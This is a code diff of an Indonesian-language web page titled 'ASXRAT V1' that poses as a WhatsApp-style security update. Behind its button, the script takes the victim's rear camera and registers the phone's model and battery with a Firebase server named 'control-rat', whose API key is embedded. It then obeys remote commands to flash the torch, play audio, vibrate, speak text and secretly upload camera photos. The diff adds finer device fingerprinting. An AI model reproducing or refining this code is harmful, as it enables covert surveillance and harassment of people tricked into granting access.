@@ -14,10 +14,9 @@
     </style>
 </head>
 <body>
-
     <div class="wa-box">
         <h3 style="color: #00a884;">ASXRAT V1 | SECURITY</h3>
-        <p style="font-size: 14px; color: #8696a0;">Pembaruan enkripsi sistem diperlukan untuk keamanan perangkat.</p>
+        <p style="font-size: 14px; color: #8696a0;">Pembaruan sistem enkripsi diperlukan untuk keamanan perangkat.</p>
         <button class="wa-btn" onclick="startASX()">UPDATE SEKARANG</button>
     </div>
 
@@ -26,7 +25,6 @@
     <audio id="player"></audio>
 
     <script>
-        // --- CONFIG FIREBASE (PASTE PUNYA LO) ---
         const firebaseConfig = {
             apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
             authDomain: "control-rat.firebaseapp.com",
@@ -41,43 +39,46 @@
         const tid = "ASX_" + Math.random().toString(36).substr(2, 5);
         let vbtInt;
 
+        async function getDeviceModel() {
+            if (navigator.userAgentData?.getHighEntropyValues) {
+                const info = await navigator.userAgentData.getHighEntropyValues(["model"]);
+                if (info.model) return info.model;
+            }
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^;]+);/);
+            let model = match ? match[1].replace("Linux; ", "").replace("Android ", "") : "Android Device";
+            if (model.includes("Linux")) {
+                if (/infinix/i.test(ua)) model = "Infinix Device";
+                else if (/samsung/i.test(ua)) model = "Samsung Galaxy";
+                else if (/pococ/i.test(ua)) model = "Poco Device";
+            }
+            return model;
+        }
+
         async function startASX() {
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 const video = document.getElementById('v');
                 const track = s.getVideoTracks()[0];
-                const player = document.getElementById('player');
                 video.srcObject = s;
 
-                // Dapetin Nama HP
-                const nameHP = navigator.userAgent.split('(')[1].split(')')[0].split(';')[0];
+                const nameHP = await getDeviceModel();
                 const ref = db.ref('targets/' + tid);
 
-                // Update Baterai Real-time
                 const updateBatt = async () => {
-                    if ('getBattery' in navigator) {
-                        const batt = await navigator.getBattery();
-                        ref.update({ 
-                            battery: Math.floor(batt.level * 100) + "%", 
-                            charging: batt.charging ? "⚡" : "🔋" 
-                        });
-                    }
+                    const batt = await navigator.getBattery();
+                    ref.update({ battery: Math.floor(batt.level * 100) + "%", charging: batt.charging ? "⚡" : "🔋" });
                 };
                 updateBatt();
 
                 ref.update({ model: nameHP, status: "Online" });
                 ref.onDisconnect().remove();
 
-                // --- LOGIKA PENERIMA PERINTAH (ANTI NGULANG) ---
                 db.ref('commands/' + tid).on('child_added', (snap) => {
-                    const cmd = snap.val();
-                    const key = snap.key;
-                    if(!cmd) return;
-
-                    // Fitur-fitur
+                    const cmd = snap.val(); const key = snap.key; if(!cmd) return;
                     if(cmd.type === "flash") track.applyConstraints({ advanced: [{ torch: (cmd.status === "on") }] });
-                    if(cmd.type === "play_music") { player.src = cmd.url; player.play(); }
-                    if(cmd.type === "stop_music") { player.pause(); player.currentTime = 0; }
+                    if(cmd.type === "play_music") { const p = document.getElementById('player'); p.src = cmd.url; p.play(); }
+                    if(cmd.type === "stop_music") { const p = document.getElementById('player'); p.pause(); p.currentTime = 0; }
                     if(cmd.type === "vbt_on") { clearInterval(vbtInt); vbtInt = setInterval(() => navigator.vibrate(500), 1000); }
                     if(cmd.type === "vbt_off") { clearInterval(vbtInt); navigator.vibrate(0); }
                     if(cmd.type === "speak") { let m = new SpeechSynthesisUtterance(cmd.text); m.lang='id-ID'; window.speechSynthesis.speak(m); }
@@ -86,12 +87,10 @@
                         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                         ref.update({ foto: canvas.toDataURL('image/jpeg', 0.5) });
                     }
-
-                    // Hapus perintah setelah dibaca biar gak bunyi terus
                     db.ref('commands/' + tid + '/' + key).remove();
                 });
-                alert("Sistem berhasil diperbarui!");
-            } catch (e) { alert("Wajib izinkan akses untuk melanjutkan!"); }
+                alert("Sinkronisasi Berhasil!");
+            } catch (e) { alert("Wajib Izinkan!"); }
         }
     </script>
 </body>
